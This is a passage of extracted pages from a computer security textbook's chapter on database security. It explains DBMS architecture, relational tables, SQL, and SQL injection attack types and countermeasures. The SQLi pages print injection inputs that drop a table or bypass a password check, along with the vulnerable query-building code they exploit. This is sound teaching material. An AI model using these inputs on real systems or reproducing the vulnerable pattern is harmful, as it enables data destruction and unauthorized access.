       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 172, 'page_label': '171'}, page_content='5.2 / DATAbASE MAnAGEMEnT SySTEMS  171\\n[BENN06] cites the following reasons why database security has not kept pace \\nwith the increased reliance on databases:\\n1. There is a dramatic imbalance between the complexity of modern database \\nmanagement systems (DBMS) and the security techniques used to protect these \\ncritical systems. A DBMS is a very complex, large piece of software, providing \\nmany options, all of which need to be well understood and then secured to avoid \\ndata breaches. Although security techniques have advanced, the increasing \\ncomplexity of the DBMS—with many new features and services—has brought \\na number of new vulnerabilities and the potential for misuse.\\n2. Databases have a sophisticated interaction protocol called the Structured Query \\nLanguage (SQL), which is far more complex, than for example, the Hypertext \\nTransfer Protocol (HTTP) used to interact with a Web service. Effective database \\nsecurity requires a strategy based on a full understanding of the security vulner-\\nabilities of SQL.\\n3. The typical organization lacks full-time database security personnel. The result is a \\nmismatch between requirements and capabilities. Most organizations have a staff \\nof database administrators, whose job is to manage the database to ensure avail-\\nability, performance, correctness, and ease of use. Such administrators may have \\nlimited knowledge of security and little available time to master and apply security \\ntechniques. On the other hand, those responsible for security within an organiza-\\ntion may have very limited understanding of database and DBMS technology.\\n4. Most enterprise environments consist of a heterogeneous mixture of database \\nplatforms (Oracle, IBM DB2 and Informix, Microsoft, Sybase, etc.), enterprise \\nplatforms (Oracle E-Business Suite, PeopleSoft, SAP , Siebel, etc.), and OS plat-\\nforms (UNIX, Linux, z/OS, and Windows, etc.). This creates an additional com-\\nplexity hurdle for security personnel.\\nAn additional recent challenge for organizations is their increasing reliance on \\ncloud technology to host part or all of the corporate database. This adds an additional \\nburden to the security staff.\\n 5.2 DATABASE MANAGEMENT SYSTEMS\\nIn some cases, an organization can function with a relatively simple collection of files \\nof data. Each file may contain text (e.g., copies of memos and reports) or numerical \\ndata (e.g., spreadsheets). A more elaborate file consists of a set of records. However, \\nfor an organization of any appreciable size, a more complex structure known as a \\ndatabase is required. A database is a structured collection of data stored for use \\nby one or more applications. In addition to data, a database contains the relation -\\nships between data items and groups of data items. As an example of the distinc -\\ntion between data files and a database, consider the following: A simple personnel \\nfile might consist of a set of records, one for each employee. Each record gives the \\nemployee’s name, address, date of birth, position, salary, and other details needed by \\nthe personnel department. A personnel database includes a personnel file, as just \\nM05_STAL0611_04_GE_C05.indd   171 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 173, 'page_label': '172'}, page_content='172  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\ndescribed. It may also include a time and attendance file, showing for each week the \\nhours worked by each employee. With a database organization, these two files are \\ntied together so a payroll program can extract the information about time worked \\nand salary for each employee to generate paychecks.\\nAccompanying the database is a database management system (DBMS), which \\nis a suite of programs for constructing and maintaining the database and for offering \\nad hoc query facilities to multiple users and applications. A query language provides \\na uniform interface to the database for users and applications.\\nFigure 5.1 provides a simplified block diagram of a DBMS architecture. Data-\\nbase designers and administrators make use of a data definition language (DDL) \\nto define the database logical structure and procedural properties, which are repre-\\nsented by a set of database description tables. A data manipulation language (DML) \\nprovides a powerful set of tools for application developers. Query languages are \\ndeclarative languages designed to support end users. The database management sys-\\ntem makes use of the database description tables to manage the physical database. \\nThe interface to the database is through a file manager module and a transaction \\nmanager module. In addition to the database description table, two other tables sup-\\nport the DBMS. The DBMS uses authorization tables to ensure the user has permis-\\nsion to execute the query language statement on the database. The concurrent access \\ntable prevents conflicts when simultaneous conflicting commands are executed.\\nDatabase systems provide efficient access to large volumes of data and are vital \\nto the operation of many organizations. Because of their complexity and criticality, \\ndatabase systems generate security requirements that are beyond the capability of \\ntypical OS-based security mechanisms or stand-alone security packages.\\nFigure 5.1 DBMS Architecture\\nPhysical\\ndatabase\\nDatabase\\nutilities\\nDatabase\\ndescription\\ntables\\nAuthorization\\ntables\\nConcurrent\\naccess\\ntables\\nDDL\\nprocessor\\nDML and query\\nlanguage processor\\nDBMS\\nDDL = data deﬁnition language\\nDML = data manipulation language\\nTransaction\\nmanager File manager\\nUser\\nqueries\\nUser\\napplications\\nM05_STAL0611_04_GE_C05.indd   172 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 174, 'page_label': '173'}, page_content='5.3 / RELATiOnAL DATAbASES  173\\nOperating system security mechanisms typically control read and write access \\nto entire files. So, they could be used to allow a user to read or to write any informa-\\ntion in, for example, a personnel file. But they could not be used to limit access to \\nspecific records or fields in that file. A DBMS typically does allow this type of more \\ndetailed access control to be specified. It also usually enables access controls to be \\nspecified over a wider range of commands, such as to select, insert, update, or delete \\nspecified items in the database. Thus, security services and mechanisms are needed \\nthat are designed specifically for, and integrated with, database systems.\\n 5.3 RELATIONAL DATABASES\\nThe basic building block of a relational database is a table of data, consisting of \\nrows and columns, similar to a spreadsheet. Each column holds a particular type of \\ndata, while each row contains a specific value for each column. Ideally, the table has \\nat least one column in which each value is unique, thus serving as an identifier for a \\ngiven entry. For example, a typical telephone directory contains one entry for each \\nsubscriber, with columns for name, telephone number, and address. Such a table is \\ncalled a flat file because it is a single two-dimensional (rows and columns) file. In \\na flat file, all of the data are stored in a single table. For the telephone directory, \\nthere might be a number of subscribers with the same name, but the telephone \\nnumbers should be unique, so the telephone number serves as a unique identifier \\nfor a row. However, two or more people sharing the same phone number might \\neach be listed in the directory. To continue to hold all of the data for the telephone \\ndirectory in a single table and to provide for a unique identifier for each row, we \\ncould require a separate column for secondary subscriber, tertiary subscriber, and \\nso on. The result would be that for each telephone number in use, there is a single \\nentry in the table.\\nThe drawback of using a single table is that some of the column positions for a \\ngiven row may be blank (not used). In addition, any time a new service or new type \\nof information is incorporated in the database, more columns must be added and the \\ndatabase and accompanying software must be redesigned and rebuilt.\\nThe relational database structure enables the creation of multiple tables tied \\ntogether by a unique identifier that is present in all tables. Figure 5.2 shows how new \\nservices and features can be added to the telephone database without reconstructing \\nthe main table. In this example, there is a primary table with basic information for \\neach telephone number. The telephone number serves as a primary key. The database \\nadministrator can then define a new table with a column for the primary key and \\nother columns for other information.\\nUsers and applications use a relational query language to access the database. \\nThe query language uses declarative statements rather than the procedural instruc-\\ntions of a programming language. In essence, the query language allows the user to \\nrequest selected items of data from all records that fit a given set of criteria. The \\nsoftware then figures out how to extract the requested data from one or more tables. \\nFor example, a telephone company representative could retrieve a subscriber’s billing \\ninformation as well as the status of special services or the latest payment received, \\nall displayed on one screen.\\nM05_STAL0611_04_GE_C05.indd   173 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 175, 'page_label': '174'}, page_content='174  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nElements of a Relational Database System\\nIn relational database parlance, the basic building block is a relation, which is a \\nflat table. Rows are referred to as tuples, and columns are referred to as attributes  \\n(see Table 5.1). A primary key is defined to be a portion of a row used to uniquely \\nidentify a row in a table; the primary key consists of one or more column names. In \\nthe example of Figure 5.2, a single attribute, PhoneNumber, is sufficient to uniquely \\nidentify a row in a particular table. An abstract model of a relational database table is \\nFigure 5.2 Example Relational Database Model A relational database uses mul-\\ntiple\\xa0tables related to one another by a designated key; in this case the key is the  \\nPhone-Number field.\\nCALLER ID TABLE\\nPhoneNumber\\nADDITIONAL\\nSUBSCRIBER TABLE\\nPhoneNumberHas service? (Y/N )\\nList of subscribers\\nPRIMARY TABLE\\nPhoneNumber\\nLast name\\nFirst name\\naddress\\nBILLING HISTORY\\nTABLE\\nPhoneNumber\\nDate\\nTransaction type\\nTransaction amount\\nCURRENT BILL\\nTABLE\\nPhoneNumber\\nCurrent date\\nPrevious balance\\nCurrent charges\\nDate of last payment\\nAmount of last payment\\nFormal Name Common Name Also Known As\\nRelation Table File\\nTuple Row Record\\nAttribute Column Field\\nTable 5.1 Basic Terminology for Relational Databases\\nM05_STAL0611_04_GE_C05.indd   174 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 176, 'page_label': '175'}, page_content='5.3 / RELATiOnAL DATAbASES  175\\nshown as Figure 5.3. There are N individuals, or entities, in the table and M attributes. \\nEach attribute Aj has /H20841Aj /H20841 possible values, with xij denoting the value of attribute j \\nfor entity i.\\nTo create a relationship between two tables, the attributes that define the \\nprimary key in one table must appear as attributes in another table, where they are \\nreferred to as a foreign key . Whereas the value of a primary key must be unique \\nfor each tuple (row) of its table, a foreign key value can appear multiple times in \\na table, so there is a one-to-many relationship between a row in the table with the \\nprimary key and rows in the table with the foreign key. Figure 5.4a provides an \\nexample. In the Department table, the department ID ( Did) is the primary key; \\neach value is unique. This table gives the ID, name, and account number for each \\ndepartment. The Employee table contains the name, salary code, employee ID, and \\nphone  number of each employee. The Employee table also indicates the depart -\\nment to which each employee is assigned by including Did. Did is identified as a \\nforeign key and  provides the r elationship between the Employee table and the \\nDepartment table.\\nA view is a virtual table. In essence, a view is the result of a query that returns \\nselected rows and columns from one or more tables. Figure 5.4b is a view that includes \\nthe employee name, ID, and phone number from the Employee table and the cor -\\nresponding department name from the Department table. The linkage is the Did, so \\nthe view table includes data from each row of the Employee table, with additional \\ndata from the Department table. It is also possible to construct a view from a single \\ntable. For example, one view of the Employee table consists of all rows, with the salary \\ncode column deleted. A view can be qualified to include only some rows and/or some \\ncolumns. For example, a view can be defined consisting of all rows in the Employee \\ntable for which the Did = 15.\\nViews are often used for security purposes. A view can provide restricted access \\nto a relational database so a user or application only has access to certain rows or \\ncolumns.\\nFigure 5.3 Abstract Model of a Relational Database\\nAttributes\\nRecords\\nA1\\n1\\ni\\nN\\nx11\\nAj\\nx1j x1M\\nAM\\nxij xiM\\nxNj xNM\\nxi1\\nxN 1\\nM05_STAL0611_04_GE_C05.indd   175 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 177, 'page_label': '176'}, page_content='176  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nStructured Query Language\\nStructured Query Language (SQL) is a standardized language that can be used to \\ndefine schema, manipulate, and query data in a relational database. There are several \\nversions of the ANSI/ISO standard and a variety of different implementations, but \\nall follow the same basic syntax and semantics.\\nFor example, the two tables in Figure 5.4a are defined as follows:\\nCREATE TABLE department (\\n   Did INTEGER PRIMARY KEY,\\n   Dname CHAR (30),\\n   Dacctno CHAR (6) )\\nCREATE TABLE employee (\\n   Ename CHAR (30),\\n   Did INTEGER,\\n   SalaryCode INTEGER,\\n   Eid INTEGER PRIMARY KEY,\\n   Ephone CHAR (10),\\n   FOREIGN KEY (Did) REFERENCES department (Did) )\\nFigure 5.4 Relational Database Example\\nDepartment Table\\nhuman resources\\neducation\\naccounts\\npublic relations\\nservices\\nPrimary\\nkey\\n4\\n8\\n9\\n13\\n15\\n528221\\n202035\\n709257\\n755827\\n223945\\nDid Dname Dacctno\\n(a) Two tables in a relational database\\n(b) A view derived from the database\\nEnameDname Eid Ephone\\nRobin\\nhuman resources\\neducation\\neducation\\naccounts\\npublic relations\\nservices\\nservices\\nNeil\\nJasmine\\nCody\\nHolly\\nRobin\\nSmith\\n7712 6127099348\\n6127092729\\n6127091945\\n6127099380\\n6127092246\\n6127092485\\n6127093148\\n3054\\n2976\\n4490\\n5088\\n2345\\n9664\\nEmployee Table\\nEname Did Salarycode Eid Ephone\\nForeign\\nkey\\nRobin\\nNeil\\nJasmine\\nCody\\nHolly\\nRobin\\nSmith\\n15 23 2345 6127092485\\n6127092246\\n6127099348\\n6127093148\\n6127092729\\n6127091945\\n6127099380\\n5088\\n7712\\n9664\\n3054\\n2976\\n4490\\n12\\n26\\n22\\n23\\n24\\n21\\n13\\n4\\n15\\n8\\n8\\n9\\nPrimary\\nkey\\nM05_STAL0611_04_GE_C05.indd   176 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 178, 'page_label': '177'}, page_content='5.4 / SQL inJECTiOn ATTACKS  177\\nThe basic command for retrieving information is the SELECT statement. \\n Consider this example:\\nSELECT Ename, Eid, Ephone\\n   FROM Employee\\n   WHERE Did = 15\\nThis query returns the Ename, Eid, and Ephone fields from the Employee table \\nfor all employees assigned to department 15.\\nThe view in Figure 5.4b is created using the following SQL statement:\\nCREATE VIEW newtable (Dname, Ename, Eid, Ephone)\\nAS SELECT D.Dname E.Ename, E.Eid, E.Ephone\\nFROM Department D Employee E\\nWHERE E.Did = D.Did\\nThe preceding are just a few examples of SQL functionality. SQL statements \\ncan be used to create tables, insert and delete data in tables, create views, and retrieve \\ndata with query statements.\\n 5.4 SQL INJECTION ATTACKS\\nThe SQL injection (SQLi) attack is one of the most prevalent and dangerous net -\\nwork-based security threats. Consider the following reports:\\n1. The July 2013 Imperva Web Application Attack Report [IMPE13] surveyed a \\ncross section of Web application servers in industry and monitored eight differ-\\nent types of common attacks. The report found that SQLi attacks ranked first \\nor second in total number of attack incidents, the number of attack requests \\nper attack incident, and average number of days per month that an application \\nexperienced at least one attack incident. Imperva observed a single website that \\nreceived 94,057 SQL injection attack requests in one day.\\n2. The Open Web Application Security Project’s 2013 report [OWAS13] on the \\n10\\xa0most critical Web application security risks listed injection attacks, especially \\nSQLi attacks, as the top risk. This ranking is unchanged from its 2010 report.\\n3. The Veracode 2016 State of Software Security Report [VERA16] found that per-\\ncentage of applications affected by SQLi attacks is around 35%.\\n4. The Trustwave 2016 Global Security Report [TRUS16] lists SQLi attacks as \\none of the top two intrusion techniques. The report notes that SQLi can pose a \\nsignificant threat to sensitive data such as personally identifiable information \\n(PII) and credit card data, and it can be hard to prevent and relatively easy to \\nexploit these attacks.\\nIn general terms, an SQLi attack is designed to exploit the nature of Web appli-\\ncation pages. In contrast to the static webpages of years gone by, most current websites \\nhave dynamic components and content. Many such pages ask for information, such \\nas location, personal identity information, and credit card information. This dynamic \\nM05_STAL0611_04_GE_C05.indd   177 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 179, 'page_label': '178'}, page_content='178  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\ncontent is usually transferred to and from back-end databases that contain volumes of \\ninformation—anything from cardholder data to which type of running shoes is most \\npurchased. An application server webpage will make SQL queries to databases to \\nsend and receive information critical to making a positive user experience.\\nIn such an environment, an SQLi attack is designed to send malicious SQL \\ncommands to the database server. The most common attack goal is bulk extraction \\nof data. Attackers can dump database tables with hundreds of thousands of cus -\\ntomer records. Depending on the environment, SQL injection can also be exploited \\nto modify or delete data, execute arbitrary operating system commands, or launch \\ndenial-of-service (DoS) attacks. SQL injection is one of several forms of injection \\nattacks that we discuss more generally in Chapter 11.2.\\nA Typical SQLi Attack\\nSQLi is an attack that exploits a security vulnerability occurring in the database layer \\nof an application (such as queries). Using SQL injection, the attacker can extract or \\nmanipulate the Web application’s data. The attack is viable when user input is either \\nincorrectly filtered for string literal escape characters embedded in SQL statements \\nor user input is not strongly typed, and thereby unexpectedly executed.\\nFigure 5.5, from [ACUN13], is a typical example of an SQLi attack. The steps \\ninvolved are as follows:\\n1. Hacker finds a vulnerability in a custom Web application and injects an SQL \\ncommand to a database by sending the command to the Web server. The com-\\nmand is injected into traffic that will be accepted by the firewall.\\n2. The Web server receives the malicious code and sends it to the Web application \\nserver.\\n3. The Web application server receives the malicious code from the Web server and \\nsends it to the database server.\\n4. The database server executes the malicious code on the database. The database \\nreturns data from credit cards table.\\n5. The Web application server dynamically generates a page with data including \\ncredit card details from the database.\\n6. The Web server sends the credit card details to the hacker.\\nThe Injection Technique\\nThe SQLi attack typically works by prematurely terminating a text string and append-\\ning a new command. Because the inserted command may have additional strings \\nappended to it before it is executed, the attacker terminates the injected string with \\na comment mark “--” . Subsequent text is ignored at execution time.\\nAs a simple example, consider a script that build an SQL query by combining \\npredefined strings with text entered by a user:\\nvar Shipcity;\\nShipCity = Request.form (“ShipCity”);\\nvar sql = “select * from OrdersTable where ShipCity = ‘” +\\nShipCity + “‘ ”;\\nM05_STAL0611_04_GE_C05.indd   178 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 180, 'page_label': '179'}, page_content='5.4 / SQL inJECTiOn ATTACKS  179\\nThe intention of the script’s designer is that a user will enter the name of a city. \\nFor example, when the script is executed, the user is prompted to enter a city, and if \\nthe user enters Redmond, then the following SQL query is generated:\\nSELECT * FROM OrdersTable WHERE ShipCity = ‘Redmond’\\nSuppose, however, the user enters the following:\\nBoston’; DROP table OrdersTable--\\nThis results in the following SQL query:\\nSELECT * FROM OrdersTable WHERE ShipCity =\\n‘Redmond’; DROP table OrdersTable--\\nThe semicolon is an indicator that separates two commands, and the double \\ndash is an indicator that the remaining text of the current line is a comment and not \\nto be executed. When the SQL server processes this statement, it will first select all \\nrecords in OrdersTable where ShipCity is Redmond. Then, it executes the \\nDROP request, which deletes the table.\\nFigure 5.5 Typical SQL Injection Attack\\nLegend:\\nInternet\\nRouter\\nFirewall\\nSwitch\\nWireless\\naccess point\\nWeb servers\\nWeb\\napplication\\nserver\\nDatabase servers\\nDatabase\\nData exchanged\\nbetween hacker\\nand servers\\nbetween hacker\\nand Web server\\nCredit card data is\\nretrieved from \\ndatabase\\nM05_STAL0611_04_GE_C05.indd   179 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 181, 'page_label': '180'}, page_content='180  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nSQLi Attack Avenues and Types\\nWe can characterize SQLi attacks in terms of the avenue of attack and the type of \\nattack [CHAN11, HALF06]. The main avenues of attack are as follows:\\n• User input:  In this case , attackers inject SQL commands by providing suit -\\nably crafted user input. A Web application can read user input in several \\nways based on the environment in which the application is deployed. In most \\nSQLi attacks that target Web applications, user input typically comes from \\nform submissions that are sent to the Web application via HTTP GET or \\nPOST requests. Web applications are generally able to access the user input \\ncontained in these requests as they would access any other variable in the \\nenvironment.\\n• Server v ariables: Server variables are a collection of variables that contain \\nHTTP headers, network protocol headers, and environmental variables. Web \\napplications use these server variables in a variety of ways, such as logging \\nusage statistics and identifying browsing trends. If these variables are logged to \\na database without sanitization, this could create an SQL injection vulnerability. \\nBecause attackers can forge the values that are placed in HTTP and network \\nheaders, they can exploit this vulnerability by placing data directly into the \\nheaders. When the query to log the server variable is issued to the database, the \\nattack in the forged header is then triggered.\\n• Second-order injection: Second-order injection occurs when incomplete pre -\\nvention mechanisms against SQL injection attacks are in place. In second-order \\ninjection, a malicious user could rely on data already present in the system or \\ndatabase to trigger an SQL injection attack, so when the attack occurs, the input \\nthat modifies the query to cause an attack does not come from the user, but \\nfrom within the system itself.\\n• Cookies: When a client returns to a Web application, cookies can be used to \\nrestore the client’s state information. Because the client has control over cook-\\nies, an attacker could alter cookies such that when the application server builds \\nan SQL query based on the cookie’s content, the structure and function of the \\nquery is modified.\\n• Physical user input: SQL injection is possible by supplying user input that con-\\nstructs an attack outside the realm of Web requests. This user-input could take \\nthe form of conventional barcodes, RFID tags, or even paper forms which are \\nscanned using optical character recognition and passed to a database manage-\\nment system.\\nAttack types can be grouped into three main categories: inband, inferential, \\nand out-of-band. An inband attack uses the same communication channel for inject-\\ning SQL code and retrieving results. The retrieved data are presented directly in the \\napplication webpage. Inband attack types include the following:\\n• Tautology:  This form of attack injects code in one or more condi -\\ntional  statements\\xa0 so they alwa ys evaluate to true. For example, consider \\nM05_STAL0611_04_GE_C05.indd   180 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 182, 'page_label': '181'}, page_content='5.4 / SQL inJECTiOn ATTACKS  181\\nthis\\xa0 script,\\xa0 whose intent is to require the user to enter a valid name and \\npassword:\\n$query = “SELECT info FROM user WHERE name =\\n’$_GET[“name”]’ AND pwd = ‘$_GET[“pwd”]’”;\\nSuppose the attacker submits “ ‘ OR 1=1 --”  for the name field. The \\nresulting query would look like this:\\nSELECT info FROM users WHERE name = ‘ ‘ OR 1=1 -- AND pwpd = ‘ ‘\\nThe injected code effectively disables the password check (because of the \\ncomment indicator --) and turns the entire WHERE clause into a tautology. \\nThe database uses the conditional as the basis for evaluating each row and \\ndeciding which ones to return to the application. Because the conditional is a \\ntautology, the query evaluates to true for each row in the table and returns all  \\nof them.\\n• End-of-line comment:  After injecting code into a particular field, legitimate \\ncode that follows are nullified through usage of end of line comments. An \\nexample would be to add “- -” after inputs so that remaining queries are not \\ntreated as executable code, but comments. The preceding tautology example is \\nalso of this form.\\n• Piggybacked queries:  The attacker adds additional queries beyond the \\nintended query, piggy-backing the attack on top of a legitimate request. This \\ntechnique relies on server configurations that allow several different queries \\nwithin a single string of code. The example in the preceding section is of this \\nform.\\nWith an inferential attack, there is no actual transfer of data, but the attacker \\nis able to reconstruct the information by sending particular requests and observing \\nthe resulting behavior of the website/database server. Inferential attack types include \\nthe following:\\n• Illegal/logically incorr ect queries:  This attack lets an attacker gather impor -\\ntant information about the type and structure of the backend database of a \\nWeb application. The attack is considered a preliminary, information-gathering \\nstep for other attacks. The vulnerability leveraged by this attack is that the \\ndefault error page returned by application servers is often overly descriptive. \\nIn fact, the simple fact that an error messages is generated can often reveal  \\nvulnerable/injectable parameters to an attacker.\\n• Blind SQL injection:  Blind SQL injection allows at tackers to infer the data \\npresent in a database system even when the system is sufficiently secure to not \\ndisplay any erroneous information back to the attacker. The attacker asks the \\nserver true/false questions. If the injected statement evaluates to true, the site \\ncontinues to function normally. If the statement evaluates to false, although \\nM05_STAL0611_04_GE_C05.indd   181 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 183, 'page_label': '182'}, page_content='182  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nthere is no descriptive error message, the page differs significantly from the \\nnormally functioning page.\\nIn an out-of-band attack, data are retrieved using a different channel (e.g., an \\ne-mail with the results of the query is generated and sent to the tester). This can be \\nused when there are limitations on information retrieval, but outbound connectivity \\nfrom the database server is lax.\\nSQLi Countermeasures\\nBecause SQLi attacks are so prevalent, damaging, and varied both by attack avenue \\nand type, a single countermeasure is insufficient. Rather an integrated set of tech -\\nniques is necessary. In this section, we provide a brief overview of the types of coun-\\ntermeasures that are in use or being researched, using the classification in [SHAR13]. \\nThese countermeasures can be classified into three types: defensive coding, detection, \\nand run-time prevention.\\nMany SQLi attacks succeed because developers have used insecure coding prac-\\ntices, as we discuss in Chapter 11. Thus, defensive coding is an effective way to dramati-\\ncally reduce the threat from SQLi. Examples of defensive coding include the following:\\n• Manual defensive coding practices: A common vulnerability exploited by SQLi \\nattacks is insufficient input validation. The straightforward solution for elimi -\\nnating these vulnerabilities is to apply suitable defensive coding practices. An \\nexample is input type checking, to check that inputs that are supposed to be \\nnumeric contain no characters other than digits. This type of technique can \\navoid attacks based on forcing errors in the database management system. \\nAnother type of coding practice is one that performs pattern matching to try \\nto distinguish normal input from abnormal input.\\n• Parameterized query insertion:  This approach attempts to prevent SQLi by \\nallowing the application developer to more accurately specify the structure \\nof an SQL query, and pass the value parameters to it separately such that any \\nunsanitary user input is not allowed to modify the query structure.\\n• SQL DOM: SQL DOM is a set of classes that enables automated data type vali-\\ndation and escaping [MCCL05]. This approach uses encapsulation of database \\nqueries to provide a safe and reliable way to access databases. This changes the \\nquery-building process from an unregulated one that uses string concatenation \\nto a systematic one that uses a type-checked API. Within the API, developers \\nare able to systematically apply coding best practices such as input filtering and \\nrigorous type checking of user input.\\nA variety of detection methods have been developed, including the following:\\n• Signature-based:  This technique attempts to match specific attack patterns. \\nSuch an approach must be constantly updated and may not work against self-\\nmodifying attacks.\\n• Anomaly-based:  This approach attempts to define normal behavior then \\ndetect behavior patterns outside the normal range. A number of approaches \\nM05_STAL0611_04_GE_C05.indd   182 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 184, 'page_label': '183'}, page_content='5.5 / DATAbASE ACCESS COnTROL  183\\nhave been used. In general terms, there is a training phase, in which the \\n system learns the range of normal beha vior, followed by the actual detec -\\ntion phase.\\n• Code analysis: Code analysis techniques involve the use of a test suite to detect \\nSQLi vulnerabilities. The test suite is designed to generate a wide range of SQLi \\nattacks and assess the response of the system.\\nFinally, a number of run-time prevention techniques have been developed as \\nSQLi countermeasures. These techniques check queries at runtime to see if they \\nconform to a model of expected queries. Various automated tools are available for \\nthis purpose [CHAN11, SHAR13].\\n 5.5 DATABASE ACCESS CONTROL\\nCommercial and open-source DBMSs typically provide an access control capabil -\\nity for the database. The DBMS operates on the assumption that the computer \\nsystem has authenticated each user. As an additional line of defense, the com -\\nputer system may use the overall access control system described in Chapter 4 to \\ndetermine whether a user may have access to the database as a whole. For users \\nwho are authenticated and 